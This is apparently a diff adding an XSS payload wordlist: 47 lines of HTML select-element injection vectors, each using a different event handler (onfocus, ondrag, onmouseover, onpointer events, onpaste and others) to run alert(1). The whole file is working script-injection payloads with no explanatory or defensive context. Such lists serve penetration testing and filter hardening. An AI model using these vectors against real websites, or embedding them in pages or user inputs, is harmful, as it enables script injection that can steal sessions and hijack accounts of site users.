@@ -1,0 +1,47 @@
+<select autofocus onfocus=alert(1)>
+<select autofocus onfocusin=alert(1)>
+<select draggable="true" ondrag="alert(1)">test</select>
+<select draggable="true" ondragend="alert(1)">test</select>
+<select draggable="true" ondragenter="alert(1)">test</select>
+<select draggable="true" ondragleave="alert(1)">test</select>
+<select draggable="true" ondragstart="alert(1)">test</select>
+<select id=x tabindex=1 onactivate=alert(1)></select>
+<select id=x tabindex=1 onbeforeactivate=alert(1)></select>
+<select id=x tabindex=1 onbeforedeactivate=alert(1)></select><input autofocus>
+<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>
+<select onafterscriptexecute=alert(1)><script>1</script>
+<select onbeforecopy="alert(1)" contenteditable>test</select>
+<select onbeforecut="alert(1)" contenteditable>test</select>
+<select onbeforepaste="alert(1)" contenteditable>test</select>
+<select onbeforescriptexecute=alert(1)><script>1</script>
+<select onblur=alert(1) id=x></select><input autofocus>
+<select onchange=alert(1)><option>change me</option><option>XSS</option></select>
+<select onclick="alert(1)">test</select>
+<select oncontextmenu="alert(1)">test</select>
+<select onchange=alert(1)><option>1<option>2
+<select oncopy=alert(1) value="XSS" autofocus tabindex=1>test
+<select oncut=alert(1) value="XSS" autofocus tabindex=1>test
+<select ondblclick="alert(1)" autofocus tabindex=1>test</select>
+<select onfocusout=alert(1) id=x></select><input autofocus>
+<select onkeydown="alert(1)" contenteditable>test</select>
+<select onkeypress="alert(1)" contenteditable>test</select>
+<select onkeyup="alert(1)" contenteditable>test</select>
+<select onmousedown="alert(1)">test</select>
+<select onmouseenter="alert(1)">test</select>
+<select onmouseleave="alert(1)">test</select>
+<select onmousemove="alert(1)">test</select>
+<select onmouseout="alert(1)">test</select>
+<select onmouseover="alert(1)">test</select>
+<select onmouseup="alert(1)">test</select>
+<select onmousewheel=alert(1)>requires scrolling
+<select onpaste="alert(1)" contenteditable>test</select>
+<select onpointerdown=alert(1)>XSS</select>
+<select onpointerenter=alert(1)>XSS</select>
+<select onpointerleave=alert(1)>XSS</select>
+<select onpointermove=alert(1)>XSS</select>
+<select onpointerout=alert(1)>XSS</select>
+<select onpointerover=alert(1)>XSS</select>
+<select onpointerrawupdate=alert(1)>XSS</select>
+<select onpointerup=alert(1)>XSS</select>
+<select autofocus onfocus=alert(1)>//INJECTX
+
